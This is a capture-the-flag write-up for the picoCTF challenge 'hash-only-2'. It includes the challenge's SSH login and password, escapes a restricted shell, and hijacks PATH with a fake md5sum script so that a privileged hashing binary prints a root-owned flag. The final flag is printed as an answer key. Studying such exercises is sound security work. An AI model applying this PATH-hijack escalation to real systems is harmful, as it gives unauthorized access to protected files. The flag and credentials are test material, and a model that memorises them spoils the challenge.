# hash-only-2
## Description
Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!

Connect using `ssh ctf-player@rescued-float.picoctf.net -p 55142` with the password, `3854745b` and run the binary named "flaghasher".
## Hints
(None)
## Solution
The shell is locked down pretty tight.

```console
ctf-player@pico-chall$ ls
ctf-player@pico-chall$ cd ..
-rbash: cd: restricted
ctf-player@pico-chall$ echo "Test" > test.txt
-rbash: test.txt: restricted: cannot redirect output
```

Let’s try a few tricks.

```console
ctf-player@pico-chall$ echo -e '#!/bin/bash\ncat "$@"\n/bin/md5sum "$@"' | tee md5sum
#!/bin/bash
cat "$@"
/bin/md5sum "$@"
ctf-player@pico-chall$ chmod +x md5sum
ctf-player@pico-chall$ bash
ctf-player@challenge:~$ PATH=.:$PATH
ctf-player@challenge:~$ flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_ce2f1235}37422299daa211fef2e6686065efa13f  /root/flag.txt
```

The `tee` command took care of writing our exploit `md5sum` script. Launching a new shell got rid of the pesky read-only problem for changing `$PATH`.
## Flag
The flag is revealed: `‌picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_ce2f1235}`